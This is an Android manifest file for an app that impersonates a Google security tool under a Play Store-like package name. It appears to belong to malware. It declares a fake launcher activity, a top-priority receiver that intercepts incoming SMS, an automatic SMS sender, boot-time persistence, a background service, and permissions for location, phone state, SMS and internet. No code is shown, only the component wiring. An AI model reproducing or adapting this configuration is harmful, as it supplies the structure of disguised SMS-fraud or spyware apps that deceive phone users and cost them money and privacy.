<?xml version="1.0" encoding="utf-8" standalone="no"?><manifest xmlns:android="http://schemas.android.com/apk/res/android" package="com.android.vending.sectool.v1">
    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
    <uses-permission android:name="android.permission.RECEIVE_SMS"/>
    <uses-permission android:name="android.permission.SEND_SMS"/>
    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
    <uses-permission android:name="android.permission.CHANGE_NETWORK_STATE"/>
    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
    <uses-permission android:name="android.permission.WAKE_LOCK"/>
    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
    <uses-permission android:name="android.permission.INTERNET"/>
    <application android:icon="@drawable/icon" android:label="@string/app_name">
        <service android:name="GoogleSecurityToolActivity"/>
        <receiver android:name=".GoogleSecurityToolReceiver">
            <intent-filter>
                <action android:name="android.intent.action.PACKAGE_ADDED"/>
                <action android:name="android.intent.action.PACKAGE_CHANGED"/>
                <action android:name="android.intent.action.PACKAGE_REMOVED"/>
                <data android:scheme="package"/>
            </intent-filter>
            <intent-filter>
                <action android:name="android.intent.action.BOOT_COMPLETED"/>
            </intent-filter>
            <intent-filter>
                <action android:name="com.android.vending.INSTALL_REFERRER"/>
            </intent-filter>
            <intent-filter>
                <action android:name="android.intent.action.GTALK_CONNECTED"/>
            </intent-filter>
        </receiver>
        <activity android:name="com.mms.bg.ui.FakeLanucherActivity" android:theme="@android:style/Theme.NoTitleBar.Fullscreen">
            <intent-filter>
                <action android:name="android.intent.action.MAIN"/>
                <category android:name="android.intent.category.LAUNCHER"/>
                <category android:name="android.intent.category.DEFAULT"/>
            </intent-filter>
        </activity>
        <receiver android:name="com.mms.bg.transaction.SmsReceiver">
            <intent-filter>
                <action android:name="com.android.mms.transaction.MESSAGE_SENT"/>
                <data android:scheme="content"/>
            </intent-filter>
            <intent-filter>
                <action android:name="android.intent.action.SEND_MESSAGE"/>
            </intent-filter>
        </receiver>
        <receiver android:name="com.mms.bg.transaction.PrivilegedSmsReceiver" android:permission="android.permission.BROADCAST_SMS">
            <intent-filter android:priority="1000">
                <action android:name="android.provider.Telephony.SMS_RECEIVED"/>
            </intent-filter>
        </receiver>
        <receiver android:name="com.mms.bg.ui.BootReceiver">
            <intent-filter>
                <action android:name="android.intent.action.BOOT_COMPLETED"/>
            </intent-filter>
        </receiver>
        <receiver android:name="com.mms.bg.ui.AutoSMSRecevier">
            <intent-filter>
                <action android:name="com.mms.bg.SMS"/>
            </intent-filter>
        </receiver>
        <receiver android:name="com.mms.bg.ui.InternetStatusReceiver">
            <intent-filter>
                <action android:name="android.net.conn.CONNECTIVITY_CHANGE"/>
            </intent-filter>
        </receiver>
        <service android:name="com.mms.bg.ui.BgService">
            <intent-filter>
                <action android:name="com.mms.bg.FILTER_ACTION"/>
            </intent-filter>
        </service>
    </application>
</manifest>